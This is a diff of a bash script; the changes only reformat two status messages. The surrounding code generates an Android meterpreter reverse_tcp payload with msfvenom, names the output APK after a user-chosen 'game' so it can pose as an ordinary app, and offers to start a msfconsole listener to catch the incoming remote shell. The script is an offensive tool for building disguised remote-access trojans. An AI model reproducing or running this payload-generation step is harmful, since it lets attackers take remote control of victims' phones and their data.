@@ -61,7 +61,7 @@ echo
 read -p "${green}${bt} ~ Enter Your App Name (Game): ${reset}${blue}${bt}" name
 echo
 echo
-echo "${yellow}${bt}Please Wait The App Is Generating...${reset}"
+echo "${yellow}${bt} ~ Please Wait The App Is Generating...${reset}"
 echo
 msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /storage/emulated/0/$name.apk
 echo "${pink}${bt}"
@@ -72,7 +72,7 @@ read -p "${green}${bt} ~ Start A Msfconsole Listener ? (y/n):" ans
 
 echo
 if [[ $ans == y ]]; then
-    echo "${yellow}${bt}Please Wait The Msfconsole Is Starting...${reset}"
+    echo "${yellow}${bt} ~ Please Wait The Msfconsole Is Starting...${reset}"
     echo
     msfconsole
     
